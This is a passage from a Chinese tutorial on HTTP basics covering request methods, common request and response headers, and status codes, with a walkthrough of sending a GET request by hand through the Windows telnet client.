请求方法中GET把请求信息直接标注在URL上，POST多用于提交数据，提交信息在后面的是请求正文中。 常见的请求头如下： User-Agent: 客户端将它的操作系统，浏览器，和其他属性告诉服务器 X-Forword-For: 代表请求段IP，可以有多个，中间以逗号隔开 Host: 请求主机名和端口号，默认80 Referer: 包含一个URL，用户从该URL代表的页面出发访问当前请求的页面 Connection: 当前连接是否保持 Accept-Language: 指定接受的自然语言 Cookie: 表示请求者身份 其中，User-Agent， X-Forword-For，Referer，Cookie 这4个 HTTP Header 尤其受到网络安全测试人员的喜爱 :) HTTP 响应介绍 常见的状态码及作用： 1xx：指示信息–表示请求已接收，继续处理 2xx：成功–表示请求已被成功接收、理解、接受 （200成功） 3xx：重定向–要完成请求必须进行更进一步的操作 （302跳转） 4xx：客户端错误–请求有语法错误或请求无法实现 （404请求资源不存在） 5xx：服务器端错误–服务器未能实现合法的请求 （500 服务器内部错误） 常见HTTP响应头： Server: WEB服务器名称 如：Server: Apache/1.3.6(Unix) Content-Type: 正文媒体类型 Content-Length: 正文长度（字节） Keep-Alive: 保持连接时间 Date: 格林时间 Location: 用于状态码为3xx的跳转，表示客户端应该到哪里去提取文档，当客户端收到后会再次发送请求 Set-Cookie: 向客户端设置Cookie信息 0x 01 使用 Telmet 手工模拟发送 HTTP 请求若使用注入 Burp Fiddler等工具截获数据包进行重放也是一样的道理。没开启Telnet服务的同学手动百度一下 如何开启Telnet服务，这里不多说了。进入CMD界面开启telnet： telnet www.baidu.com 80 显示空白黑屏界面，在键盘上同时按“Ctrl”键和“]”键，显示如下界面： 欢迎使用 Microsoft Telnet Client Escape 字符为 &apos;CTRL+]&apos; Microsoft Telnet&gt; 按“Enter”键 显示空白界面，输入HTTP请求(注意HOST: 后面有个空格) GET /index.html HTTP/1.1 HOST: www.baidu.com 之后连续按两次“Enter”键，完成HTTP请求发送，显示如下信息： 至此，已经成功完成HTTP发送模拟。","categories":[],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"http://www.evilclay.com/tags/HTTP/"},{"name":"Wiki","slug":"Wiki","permalink":"http://www.evilclay.com/tags/Wiki/"}]}]}